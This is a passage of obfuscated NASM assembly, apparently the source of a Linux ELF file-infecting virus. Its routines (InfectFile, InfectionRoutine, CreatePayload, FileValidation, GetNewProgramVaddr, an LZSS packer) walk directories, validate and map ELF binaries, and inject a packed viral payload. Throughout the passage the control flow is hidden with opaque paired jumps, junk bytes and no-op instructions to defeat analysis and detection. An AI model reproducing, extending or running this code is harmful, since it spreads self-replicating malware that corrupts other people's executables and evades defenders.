    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    jl          ..@cyTowqbaOIhs
    jge         ..@cyTowqbaOIhs
DestroyPayload:
    jmp         ..@ErnYEvlExn4E
..@Qg7CZdVzojMH:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         ..@9IEowmpQxE0Y
..@prMWVdrimG1d:
    call        AddSizeMappedFile
    jb          ..@uUgHRgr5op3H
    jae         ..@uUgHRgr5op3H
..@QcQJSK8xgr6y:
    pop         rdx
    jmp         ..@xnILBSYaEzNo
..@YewxPKxzSD4l:
    push        rdx
    jb          ..@o9e1EQ8wh4lA
    jae         ..@o9e1EQ8wh4lA
..@Wbf07YEKhwu2:
    jle         ..@Twt8qn8J53By
    jmp         $+5
db 0x62, 0xa3, 0xfe
    jmp         ..@TIvtvq2XgitC
..@fKGmJblrh4YH:
    mov         dx, WORD [rsp] 
    jmp         $+4
db 0x21, 0x01
    jl          ..@ACsDVpFt883j
    jge         ..@ACsDVpFt883j
..@Whh35oLfjAew:
    add         r2, e_h.e_shoff
    add         r1, QWORD [r2]
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         ..@an026x4hGLEN
..@gdeQf9OuYrNe:
    cmp         r2d, '../'
    jmp         ..@Xx0h8tzo68Yz
..@w9DVSbhpHlYo:
    pop         rdx
    je          ..@DpPhHYwiA2NJ
    jne         ..@DpPhHYwiA2NJ
..@BrBQ3RXtDnv9:
%ifdef X86_64
    push        rbx
%endif
    jmp         ..@o4EgniIRO42R
..@rcyGHpUAmDfF:
    pop         rdx
    cmp         BYTE [r1], 0x39
    jg          ..@1WdljG0TCTof
    jmp         ..@myVLS40071L1
..@TgDiR3NBDTUJ:
%ifdef X86_64
    xor         r9, r9
    push        rdi
    pop         rdi
%endif
    jmp         ..@qwIXwVK5hIMB
..@uxyWLHFxCJEm:
    mov         eax, SYS_MREMAP
    jmp         $+3
db 0x53
    jb          ..@2p3k0yPv9Wyl
    jae         ..@2p3k0yPv9Wyl
..@D1SHujfa4fX4:
    mov         r1, m6
    add         r1, _signature-_start
    jmp         $+4
db 0xdb, 0xa4
    jb          ..@Q4IeeVnYVYOz
    jae         ..@Q4IeeVnYVYOz
NonBinaryFile:
    jmp         ..@g2J4t3YjjiQm
..@ALwYbAtEnGik:
    jl          ..@ACsDVpFt883j
    mov         rdi, rdi
    mov         rdx, rdx
    jmp         $+3
db 0xe0
    jl          ..@f8BJbhB8iiNq
    jge         ..@f8BJbhB8iiNq
..@fVnxTn8GJREd:
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+3
db 0x14
    jmp         $+3
db 0x00
    jmp         ..@BVQn395gesjp
..@c2NP2yfSUSjQ:
    jne         ..@uVVpSXTwoi4l
    jmp         $+3
db 0x17
    jb          ..@6fQIX6iqD39S
    jae         ..@6fQIX6iqD39S
..@drCjZsGrh4I7:
    add         r5, rax
    add         r5, 1
    jmp         $+5
db 0x96, 0xdd, 0x9a
    je          ..@9feKRmxxLPxh
    jne         ..@9feKRmxxLPxh
..@gGWzGwgdMRTX:
    xchg        rax, rax
    jmp         ..@dcljI6ZA9ShT
..@NQnrDC9D8iLq:
    xchg        rcx, rcx
    lea         r1, [rsp+_PROC_OFF.buffer]
    jmp         $+4
db 0x8d, 0xd4
    jmp         $+5
db 0x52, 0x7a, 0x97
    jmp         ..@gGWzGwgdMRTX
..@jNm8xzPL8Pte:
    mov         r2, original_virus_len+PADDING
    mov         eax, SYS_MUNMAP
    jmp         $+4
db 0xb3, 0x2a
    jmp         ..@Ci7VT2TggIGm
..@CiJUnDybPm8M:
    xchg        rbx, rbx
    mov         r4d, DWORD [r1 + file.filefd]
    mov         rsp, rsp
    je          ..@w6rJvx2AUBz1
    jne         ..@w6rJvx2AUBz1
..@VPHpJ840Vo6T:
    ret
    jmp         $+5
db 0xfb, 0xba, 0x6f
    jmp         $+4
db 0x2f, 0xbc
    jmp         LzssEncoder
..@ZZusIXiNA1JW:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         $+3
db 0x71
    je          ..@AQRL3Pni3VYW
    jne         ..@AQRL3Pni3VYW
..@HT2fAHCkF0te:
    xchg        rsi, rsi
    syscall
    jmp         $+4
db 0xdb, 0x3a
    jmp         $+5
db 0x72, 0x74, 0x0c
    jmp         $+4
db 0x0f, 0x7c
    jmp         ..@N1FK3M8wctQb
..@WxgUHqeocRD9:
%ifdef X86_64
    xchg        rdi, rdi
    mov         r8, 0xffffffffffffffff
%endif
    jmp         ..@bqTPwpOvUJji
..@aEkuGWh9Oe7T:
    add         rsp, _PAYLOAD_OFF_size
    jb          ..@024sIqYr5IlJ
    jae         ..@024sIqYr5IlJ
..@0f0KoW0Kpare:
    mov         rax, r2
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+3
db 0x2c
    jb          ..@kdKPBavBGvT4
    jae         ..@kdKPBavBGvT4
..@CBt5nX8sgwhQ:
    test        eax, eax
    je          ..@qhttCiOxUzjQ
    jne         ..@qhttCiOxUzjQ
..@ZnI3FZmOvJdc:
    pop         rdi
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    jmp         $+3
db 0x5a
    jb          ..@PFp7EyEgYX7J
    jae         ..@PFp7EyEgYX7J
..@h2cehasuBuJi:
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    xchg        rsi, rsi
    jmp         $+3
db 0x74
    jmp         $+4
db 0x64, 0x19
    jmp         ..@fNz41FPOkCVF
..@q1OjV2AmzoQd:
    push        rcx
    pop         rcx
    add         r2, 1
    jmp         ..@pu5llpXs0eqV
..@m3wEKfx2xwyY:
    push        rcx
    jl          ..@zDhz7LEqYKAF
    jge         ..@zDhz7LEqYKAF
..@axr1DQ86RLz2:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    je          ..@cJIZ8mZh7p9q
    jne         ..@cJIZ8mZh7p9q
..@hE6jpFz19jao:
    add         rsp, _NBF_OFF_size
    jl          ..@HcziUTSAfYrU
    jge         ..@HcziUTSAfYrU
..@6JbkgVniDvXj:
    push        rdx
    js          ..@7edqvcuLy5i6
    jns         ..@7edqvcuLy5i6
..@uFcLqbMUAlzw:
    jmp         ..@r9cJrHY8FJZx
    js          ..@bPUXO4FcPWDS
    jns         ..@bPUXO4FcPWDS
..@dfDb1ZZ8PhFT:
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    js          ..@2LkxG3kESMWZ
    jns         ..@2LkxG3kESMWZ
..@fWp2BQflbHvf:
    mov         rsp, rsp
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    jmp         $+4
db 0x39, 0x5f
    jmp         ..@fVnxTn8GJREd
..@vJTjw3fvRCrn:
    mov         r3, QWORD [r5+file.filesize]
    call        MemMove
    mov         rcx, signature_len
    jmp         $+4
db 0x4e, 0x9b
    jmp         ..@Du4x2O04ctVR
..@tihPXq6fotl3:
    pop         rcx
    jl          ..@CX3Tc0Q6dBIw
    jmp         $+5
db 0x3f, 0x09, 0xd3
    jmp         ..@i0sUQyeJ6VHK
..@7edqvcuLy5i6:
    pop         rdx
    jmp         ..@sVZ8R87XSjF6
..@4mxahrRxYbh1:
    xchg        rsp, rsp
    jmp         $+3
db 0x70
    js          ..@9CNWaTUZMOb8
    jns         ..@9CNWaTUZMOb8
..@cTj567dxWYgY:
    jl          ..@QNyD9MiLciud
    jmp         $+4
db 0x29, 0xfe
    jl          ..@caQKIcVnG4yx
    jge         ..@caQKIcVnG4yx
..@R2sbdsHWd7I2:
    ret
    jmp         $+4
db 0x05, 0x01
    jl          ..@yLIx0qlvth3I
    jge         ..@yLIx0qlvth3I
..@aZD6ylk7TYdm:
    add         r4, r3
    xor         r2, r2
    js          ..@UfiZS9F8fT0e
    jns         ..@UfiZS9F8fT0e
..@7c1hPO05UnRK:
    mov         rsi, rsi
    push        rcx
    jmp         ..@2wYAkBl7hEQ1
..@qqlo3acAyvaz:
    pop         rcx
    jmp         $+4
db 0x46, 0x93
    jb          ..@NlzCfjhnlnKk
    jae         ..@NlzCfjhnlnKk
..@EV0zvNpexTvo:
    mov         r3, non_packed_len
    call        MemMove
    jmp         $+3
db 0x1e
    jmp         ..@GSGfXLem6vGQ
..@Ow2WU97duV4S:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+3
db 0x99
    jmp         $+4
db 0xdf, 0xf8
    jmp         $+4
db 0xf6, 0x9b
    jmp         $+3
db 0x4c
    jl          ..@nr1VDbvZYv62
    jge         ..@nr1VDbvZYv62
..@w4mDUBN10Wer:
    test        rax, rax
    jnz         ..@uVVpSXTwoi4l
    js          ..@nJdKBFye7Yrm
    jns         ..@nJdKBFye7Yrm
..@YQBdDLq3yH5A:
    VAR         packed, procdir
    js          ..@ZwDJPT2e672Y
    jns         ..@ZwDJPT2e672Y
..@TXXK3ZOz5fjr:
    mov         r5, [rsp]
    jmp         $+3
db 0x57
    jl          ..@0aoKu1F9uk4C
    jge         ..@0aoKu1F9uk4C
..@Vtoi4yOipdrq:
    mov         BYTE [r1], '/'
    jb          ..@RyDoercmV0Ub
    jae         ..@RyDoercmV0Ub
..@T4eM1Yq4m4CH:
    mov         rbx, rbx
    jmp         ..@jNhnHVk9ALj3
..@qwIXwVK5hIMB:
%ifdef X86_64
    mov         rsi, original_virus_len+PADDING
%endif
    jl          ..@FpTsDCcesnMI
    jge         ..@FpTsDCcesnMI
..@P5Z0GrwfQjox:
    mov         QWORD m5, 0x01
    js          ..@ZldyTwXdQokT
    jns         ..@ZldyTwXdQokT
FileValidation:
    jmp         ..@lqAXUTjIIzf0
..@lgPH9vEQZgr3:
    call        CreatePayload
    pop         r3
    pop         r2
    je          ..@euJYQi2YFPVT
    jne         ..@euJYQi2YFPVT
..@G6PQASUnoc5B:
    jmp         ..@DXwWwrBudibD
    jmp         $+3
db 0xa2
    je          ..@lAVOTGw42AA4
    jne         ..@lAVOTGw42AA4
..@amCiHzRDFP9n:
    push        rsi
    jmp         $+3
db 0x2c
    jb          ..@ZXN5ZKKUAVlP
    jae         ..@ZXN5ZKKUAVlP
..@o9e1EQ8wh4lA:
    pop         rdx
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    jb          ..@GyVl32kbegW4
    jae         ..@GyVl32kbegW4
..@vjh834wnyZ7F:
    add         eax, 0x30
    xchg        rax, rax
    jmp         ..@Sjao7QFtjUgJ
    jmp         $+5
db 0xbe, 0x3d, 0x7f
    jmp         $+4
db 0x3a, 0x04
    jmp         ..@oKFnaVMVC1bF
..@PT62GvJpfVXu:
    xchg        rdx, rdx
    jmp         $+3
db 0xfa
    jmp         $+5
db 0xda, 0x33, 0x0c
    js          ..@Uw7hLHUumqxJ
    jns         ..@Uw7hLHUumqxJ
..@kD9uXniLpgFo:
    xchg        rsi, rsi
    xchg        rcx, rcx
    inc         WORD m5
    jl          ..@yYDWO0bTSpTq
    jge         ..@yYDWO0bTSpTq
..@ClRNJuc7Xk07:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+4
db 0x10, 0x50
    jmp         ..@Zy8eDcuGSisj
..@3ZzhFSRu18de:
    jne         ..@uVVpSXTwoi4l
    jmp         $+5
db 0x1c, 0x48, 0x49
    jmp         ..@pPVmN9Din2cH
..@7YKr770cr832:
    mov         rcx, rcx
    mov         al, BYTE [rdi]
    jmp         $+4
db 0x34, 0x54
    jmp         ..@5MSM4SLs05zp
..@nKG2hjWbU3Ki:
    cmp         QWORD m7, 0x00
    je          ..@x678uq32skNY
    jmp         ..@PGjRZzdoSBaZ
..@0ygiB2tak5yx:
    test        r2, r2
    jnz         ..@uVVpSXTwoi4l
    mov         r1, r5
    jl          ..@vAw21EJ5VCHJ
    jge         ..@vAw21EJ5VCHJ
..@zZYNjlMBEXDV:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+4
db 0xf0, 0xf2
    jmp         $+4
db 0x06, 0x68
    js          ..@gS5eRMD0jLTe
    jns         ..@gS5eRMD0jLTe
..@zUmwG0sQ1eQT:
%ifdef X86_64
    xor         rdx, rdx
%endif
    jmp         $+5
db 0x3a, 0xa7, 0x65
    jmp         $+5
db 0xb1, 0xc4, 0xde
    jmp         ..@ymjfR4YnjzhQ
..@YYiLOgcWwOoh:
    mov         r3, rax
    call_vsp    Strncmp
    test        ax, ax
    jmp         $+5
db 0xe0, 0x8b, 0xf2
    jl          ..@vWsuH07xUBGQ
    jge         ..@vWsuH07xUBGQ
..@CrcmCnXNPWN7:
    push        rax
    pop         rax
    mov         edx, 100000000b
    jmp         $+3
db 0x02
    jmp         $+5
db 0x12, 0xe3, 0x41
    jl          ..@r6kdMLMVpvZ1
    jge         ..@r6kdMLMVpvZ1
..@n1BL75UNoqMn:
    cmp         BYTE [r1], 0x0
    jb          ..@sykVVZLGaWbf
    jae         ..@sykVVZLGaWbf
..@IZa1LqHfhiQI:
    mov         rax, SYS_GETCWD
    syscall
    jl          ..@YPshILMsIzCM
    jge         ..@YPshILMsIzCM
..@68T2RC2dvqtk:
    call        Strcpy
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+5
db 0xb5, 0x05, 0xda
    jmp         $+4
db 0xf5, 0x1f
    jb          ..@D8PlNqb5iOsc
    jae         ..@D8PlNqb5iOsc
..@bN7Sucl1iSdy:
    pop         rsi
    pop         rsi
    xor         rax, rax
    jmp         $+3
db 0x8f
    jl          ..@zZYNjlMBEXDV
    jge         ..@zZYNjlMBEXDV
..@ZwbwghGan5sh:
    mov         rax, [r5+file.filesize]
    jb          ..@2upU3nWzMhKd
    jae         ..@2upU3nWzMhKd
..@Q0iQzAOdOjuW:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    push        rbx
    jmp         $+5
db 0x7c, 0x7e, 0x04
    js          ..@FQSWxfb0g8eU
    jns         ..@FQSWxfb0g8eU
..@8XuUzLzcwkME:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+3
db 0xdb
    jmp         ..@ptMyK3P7Gy0U
..@RUQEeT8X7Net:
    jle         ..@x678uq32skNY
    mov         r5, r3
    mov         r3, rax
    jmp         ..@HniI838ZMEFp
..@D8PlNqb5iOsc:
    xor         r2, r2
    jb          ..@WNfLURkaXBay
    jae         ..@WNfLURkaXBay
..@teF9owBr1LKq:
    mov         rdx, rdx
    jmp         $+5
db 0x36, 0x46, 0x97
    js          ..@QJ8gVt8xx79L
    jns         ..@QJ8gVt8xx79L
..@rqwlaapy4t93:
    mov         rax, SYS_MUNMAP
    syscall
    jmp         $+3
db 0x94
    js          ..@s01BYyyLYxwt
    jns         ..@s01BYyyLYxwt
..@YeHMjpDH7WST:
    push        rdi
    jmp         $+3
db 0xed
    jmp         ..@Vr42iUQ96wPR
..@mEP4jdS52b6Q:
    xor         rax, rax
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    jmp         $+5
db 0x6e, 0x53, 0x7e
    jmp         ..@fgWG5jqFvQU5
..@5sjH2OopuSZL:
%ifdef X86_32
    push        ebp
    xor         ebp, ebp
%endif
    jl          ..@nOJ5DlKZW4Kk
    jge         ..@nOJ5DlKZW4Kk
..@y7VIaJxAJIXJ:
    GGLOBAL     _signature
    mov         r1, r5
    jmp         $+4
db 0xba, 0xdd
    jmp         $+5
db 0x5b, 0xae, 0x17
    js          ..@EAmicT7h6Xxc
    jns         ..@EAmicT7h6Xxc
..@dKVVWCOQoP27:
    mov         BYTE [rdi], al
    js          ..@A0zjzcwfXVJP
    jns         ..@A0zjzcwfXVJP
..@bqTPwpOvUJji:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+3
db 0x35
    jmp         $+4
db 0x70, 0xd5
    je          ..@iI1vd5F90vdH
    jne         ..@iI1vd5F90vdH
..@EHSPv4udHMjw:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    je          ..@cIWONLOZbqyW
    jne         ..@cIWONLOZbqyW
..@MdP3vSiqByHX:
    jg          ..@5QVKqfkIgiVk
    jmp         ..@thJYo6aakfpP
..@I7FAJ1bwQTVm:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         ..@tmpikIP337U5
..@qrNEaB97vm3O:
    pop         rdx
    js          ..@jaz9OkcVqKTL
    jns         ..@jaz9OkcVqKTL
..@7H4hQvxeVdOX:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    xchg        rax, rax
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    js          ..@VeZDiSfqhhV7
    jns         ..@VeZDiSfqhhV7
..@euJYQi2YFPVT:
    xchg        rcx, rcx
    jmp         $+5
db 0x4a, 0x94, 0xa4
    jl          ..@ulXlFOw14LGB
    jge         ..@ulXlFOw14LGB
..@BiekZzM4wLl2:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    call        Strcpy
    js          ..@irnnu9X5r9nO
    jns         ..@irnnu9X5r9nO
..@eJVldatVQmwL:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         rcx, rax
    jmp         $+5
db 0x5e, 0x10, 0x30
    jmp         ..@wFVyTZeOV9pL
..@gS5eRMD0jLTe:
    push        rdi
    jmp         $+3
db 0xf3
    jmp         ..@vCfdfHacq8zX
..@ASJg0gdFhJha:
    mov         r1, m6
    jmp         $+4
db 0xed, 0xb4
    jb          ..@PneUMzRdx1xb
    jae         ..@PneUMzRdx1xb
..@IkpjPWMEGsa0:
    xchg        rbx, rbx
    push        rsi
    js          ..@HR2yE27QEhEk
    jns         ..@HR2yE27QEhEk
LzssEncoder:
    jmp         ..@h2TLKj7n7MaO
..@h2TLKj7n7MaO:
    sub         rsp, _LZSSE_OFF_size
    jmp         $+4
db 0xe5, 0x21
    jmp         ..@retDJR0yTSHl
..@arlr1AKx59HW:
    xor         rax, rax
    xor         rcx, rcx
    js          ..@vxMV6gdgWMYX
    jns         ..@vxMV6gdgWMYX
..@CX3Tc0Q6dBIw:
    add         rsp, _PROC_OFF_size
    jb          InfectionRoutine
    jae         InfectionRoutine
..@GvVvKi1mRuw9:
    cmp         rax, 0xffffffffffffffff
    je          ..@58T9lA0lkm5e
    jmp         $+3
db 0xba
    jmp         ..@TXXK3ZOz5fjr
..@nOJ5DlKZW4Kk:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    js          ..@rEKts64xwmEy
    jns         ..@rEKts64xwmEy
IsELFComplete:
    jmp         ..@VkG6pY9mrPjr
..@56CVr7zIGBlS:
    push        r3
    call        GetNewProgramVaddr
    jl          ..@U61COKN4m95u
    jge         ..@U61COKN4m95u
..@wIuxZkUxk6IU:
    pop         rcx
    jb          ..@ozx5gZg5lmIG
    jae         ..@ozx5gZg5lmIG
..@Lrbh8QUp1HGY:
    jmp         ..@oKFnaVMVC1bF
    jb          ..@vjh834wnyZ7F
    jae         ..@vjh834wnyZ7F
..@AnXj6cEfolAg:
    add         r4, 1
    jl          ..@9TtIuND9Dojx
    jge         ..@9TtIuND9Dojx
..@f8BJbhB8iiNq:
    pop         rax
    js          ..@iRRMDGCNa6t9
    jns         ..@iRRMDGCNa6t9
..@1VSTIvHlvBYO:
    mov         r2, 11b
    call        MapFile
    jmp         $+3
db 0xba
    jmp         ..@zrazFhVRUNRv
..@mpQDvjCdcudv:
    ret
    jmp         $+4
db 0x77, 0x8f
    js          InfectFile
    jns         InfectFile
..@yYDWO0bTSpTq:
    jmp         ..@x678uq32skNY
    jmp         $+4
db 0xee, 0x52
    jmp         ..@T2wpTqJE1Q6W
..@zfxpGRZKFM4K:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jmp         $+5
db 0x21, 0x54, 0x34
    jmp         $+3
db 0xd2
    jb          ..@WxgUHqeocRD9
    jae         ..@WxgUHqeocRD9
..@Yz2UwXLXNT3D:
%ifdef X86_32
    mov         edx, esi
    mov         esi, 0x01
%endif
    jmp         $+3
db 0x85
    jmp         $+4
db 0xb1, 0x2d
    jmp         $+4
db 0x14, 0x9b
    jmp         ..@NFlECR6WCCgX
..@g2J4t3YjjiQm:
    sub         rsp, _NBF_OFF_size
    jmp         $+3
db 0x26
    jmp         ..@Wb8sE2Hu4Ywv
..@tMrDXT7xPnO2:
    push        r5
    jmp         ..@a9G7Jd7sC5o7
..@GIBmUQ3Pape3:
    ret
    jmp         $+5
db 0x93, 0x24, 0xbf
    jl          ..@5QVKqfkIgiVk
    jge         ..@5QVKqfkIgiVk
..@xnILBSYaEzNo:
    pop         rdi
    jmp         ..@eah9WsbuVzDv
..@v2nqTifjBtPi:
    xor         r2, r2
    xor         r3, r3
    jl          ..@D1SHujfa4fX4
    jge         ..@D1SHujfa4fX4
..@yekCGuHkVuib:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         $+5
db 0xb7, 0xb0, 0xe9
    jmp         ..@Twt8qn8J53By
..@qD1oJTQy72Mk:
    pop         rdi
    jmp         ..@BiekZzM4wLl2
..@EzjdlGPUGlBG:
    add         rdi, non_packed_len
    jmp         $+5
db 0x63, 0x00, 0x70
    jl          ..@5TLgOYHZkxV9
    jge         ..@5TLgOYHZkxV9
..@2p3k0yPv9Wyl:
    push        rdx
    pop         rdx
    je          ..@VdsMOOwHMslf
    jne         ..@VdsMOOwHMslf
..@RyDoercmV0Ub:
    add         r1, 1
    jmp         ..@k8vQnFPI6ByA
..@zA7xggA5T15n:
    rep         nop
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    jmp         ..@zM3IXL2Swls8
..@OCQemGEJp8B6:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+5
db 0x38, 0x3c, 0xe4
    jl          ..@dtRlskH09gLC
    jge         ..@dtRlskH09gLC
..@Q7PKgHutGbW1:
    add         m7, rax
    jb          ..@rtT8ffMk6fOT
    jae         ..@rtT8ffMk6fOT
..@xjGTOxQlh8n1:
    jge         ..@O5YSYSpv3Cwx
    push        rbx
    pop         rbx
    jmp         $+3
db 0x26
    js          ..@mg7HhjFA3TuN
    jns         ..@mg7HhjFA3TuN
..@GREQkxTrfSmB:
    jl          ..@zOkjhDLcQyD3
    mov         rdx, rdx
    jmp         ..@dfAqAT2EaJ2k
..@GhAmVZVMNP7x:
    mov         QWORD [r5+file.filesize], 0x00
    jb          ..@zvw3m56e56nc
    jae         ..@zvw3m56e56nc
..@a9G7Jd7sC5o7:
    push        rcx
    jb          ..@hHyrUBFLV4X0
    jae         ..@hHyrUBFLV4X0
..@iAbYZFAf8D96:
    je          ..@evhvF8uVil70
    cmp         rdi, rsi
    jmp         $+5
db 0x17, 0x08, 0x4e
    jmp         ..@G4Qu0km3N54P
MemMove:
    jmp         ..@9sbOmwEAyPXy
..@gjvQRP4RSpnw:
    add         rsi, rdx
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         $+3
db 0x23
    jl          ..@qkl6fPMUet3k
    jge         ..@qkl6fPMUet3k
..@nqQq0NnexbPW:
    jne         ..@5QVKqfkIgiVk
    cmp         BYTE [r1+4], ELFCLASS
    jne         ..@5QVKqfkIgiVk
    jmp         $+5
db 0x25, 0xe8, 0xde
    jmp         $+4
db 0x30, 0x90
    jmp         $+3
db 0x15
    jmp         ..@ejxOLwx2T3Sf
..@EYMud74r5Xa8:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    xor         rcx, rcx
    jmp         $+5
db 0x46, 0x47, 0x76
    jmp         $+3
db 0x8a
    jmp         ..@YKhC0BEzdEPG
..@rLJPykzAhemM:
    push        rdx
    jmp         $+5
db 0xac, 0xc7, 0xbc
    jmp         $+3
db 0x51
    jmp         $+5
db 0x0c, 0x28, 0x2b
    jmp         ..@aq2pbgIR1yhj
..@Mn8ALfs9wwh4:
%ifdef X86_32
    xor         eax, eax
    xor         ebx, ebx
    mov         ecx, DWORD [edi+file.filesize]
%endif
    jl          ..@Yz2UwXLXNT3D
    jge         ..@Yz2UwXLXNT3D
..@kdKPBavBGvT4:
    mul         r3 
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    js          ..@PSPE0GtY4xgT
    jns         ..@PSPE0GtY4xgT
..@OnmlEnwa2goD:
%ifdef X86_32
    mov         edi, DWORD [edi+file.filefd]
    xchg        rdx, rdx
%endif
    jmp         ..@5sjH2OopuSZL
..@Y2Y4J2jGCoEq:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    xchg        rsp, rsp
    jmp         $+5
db 0x0b, 0xad, 0xd6
    jmp         $+4
db 0xd9, 0x6f
    jmp         ..@4dIyOB7uBfyU
..@JK3yrvSdjvWH:
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    js          ..@yEk9YGRXr1Dj
    jns         ..@yEk9YGRXr1Dj
..@Eq7nA7XuCBT2:
    mov         ecx, WINDOW_LENGTH
    jmp         $+3
db 0xb7
    jmp         ..@W87G0bloX7Gu
..@tlplPr5G1fXq:
    pop         r3
    mov         rax, rax
    pop         r4
    js          ..@w5wAOV7NRMUC
    jns         ..@w5wAOV7NRMUC
..@dcljI6ZA9ShT:
    mov         r2, [rsp+_PROC_OFF.dirname]
    mov         rcx, rcx
    jmp         $+4
db 0x51, 0x96
    jmp         ..@nFavDogu3CtJ
..@yI3C8bCN2CLH:
    push        r5
    jmp         $+4
db 0xe0, 0xcc
    jmp         ..@FQfT8rCne0ub
..@lAVOTGw42AA4:
    xchg        rax, rax
    js          ..@49qrjt2V3XrX
    jns         ..@49qrjt2V3XrX
..@C6vABtxSVoto:
    xor         rax, rax
    xor         rdx, rdx
    jmp         $+4
db 0x21, 0x3d
    jmp         $+4
db 0xdd, 0xa9
    jb          ..@DvGBEVEdksu7
    jae         ..@DvGBEVEdksu7
..@nMKrUYnRgHFD:
    mov         r2, QWORD [r1+file.filename]
    jmp         $+4
db 0xc6, 0xea
    jmp         $+3
db 0x5a
    jmp         ..@upBcndUQxAgq
..@RC6FWZaDQnPG:
    push        rcx
    jmp         $+4
db 0x3a, 0x14
    jl          ..@wIuxZkUxk6IU
    jge         ..@wIuxZkUxk6IU
..@DvGBEVEdksu7:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jmp         $+4
db 0x28, 0xb4
    jmp         ..@XEYWxJZ7PUIZ
..@BH2b3xPmYUab:
    xor         r4, r4
    je          ..@phxuYiWB0aIS
    jne         ..@phxuYiWB0aIS
..@23ZgpS5mjmpA:
    mov         rdx, rdx
    jmp         ..@Q0iQzAOdOjuW
..@vCfdfHacq8zX:
    pop         rdi
    jb          ..@sLg6suZWKdAm
    jae         ..@sLg6suZWKdAm
..@Qc6hBQKTP2FY:
    push        rdx
    jmp         $+5
db 0x57, 0xd0, 0x49
    js          ..@w9DVSbhpHlYo
    jns         ..@w9DVSbhpHlYo
..@e1Zh7shLWKwu:
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    xchg        rax, rax
    jl          ..@6amLGwErElFb
    jmp         $+3
db 0x11
    jl          ..@o2VjZcbkKRa6
    jge         ..@o2VjZcbkKRa6
InfectFile:
    jmp         ..@TSFXpTMbImoB
..@TFNDb9uFfLAH:
    pop         rbx
    jmp         $+5
db 0xbd, 0x66, 0x49
    jb          ..@GDesmzQ2pwYN
    jae         ..@GDesmzQ2pwYN
..@O8DJ8jrXxhyD:
    rep         nop
    rep         nop
    jmp         $+3
db 0x39
    js          ..@PWn6VrktyxD6
    jns         ..@PWn6VrktyxD6
..@wZBLJW4TDMy0:
    mov         r1, r4
    jmp         $+3
db 0x09
    jmp         ..@ZwbwghGan5sh
..@bybWDGZ8DtcH:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    js          ..@XFy3ZUa5I3hG
    jns         ..@XFy3ZUa5I3hG
..@DTk78nNJv0rO:
    push        r2
    jmp         $+4
db 0x73, 0xe7
    jmp         $+3
db 0xf4
    js          ..@6cICFlxkTDqJ
    jns         ..@6cICFlxkTDqJ
..@cebF7ZuXpxOJ:
    mov         r2w, WORD [r1+e_h.e_phnum]
    je          ..@42MksSPUJ9Yi
    jne         ..@42MksSPUJ9Yi
..@f9mVeu7XCVmS:
    push        r1
    sub         rsp, _VADDR_OFF_size
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jmp         $+5
db 0x28, 0x49, 0x77
    jb          ..@BipVKw2y5pRi
    jae         ..@BipVKw2y5pRi
..@T7OTChtoaahp:
    ret
    jmp         $+4
db 0xb7, 0xdb
    jmp         $+3
db 0xe9
    js          MapFile
    jns         MapFile
..@UVkIGR4lureP:
    std
    mov         rdx, rdx
    mov         rbx, rbx
    jmp         $+4
db 0xd1, 0x72
    jb          ..@it9fSZeHJKT0
    jae         ..@it9fSZeHJKT0
..@X23B55n7TLHM:
    mov         rax, (-1)
    jl          ..@hcDALAwtCx2I
    jge         ..@hcDALAwtCx2I
..@eah9WsbuVzDv:
    mov         edx, LOOKAHEAD_LENGTH
    cmp         ax, LOOKAHEAD_LENGTH
    cmovl       dx, ax
    jmp         $+5
db 0x77, 0xa2, 0x72
    jmp         $+4
db 0xd5, 0x34
    je          ..@HMsvByt7j9Su
    jne         ..@HMsvByt7j9Su
..@UW9D0xkviezr:
    pop         rsi
    xor         r3, r3
    jmp         $+4
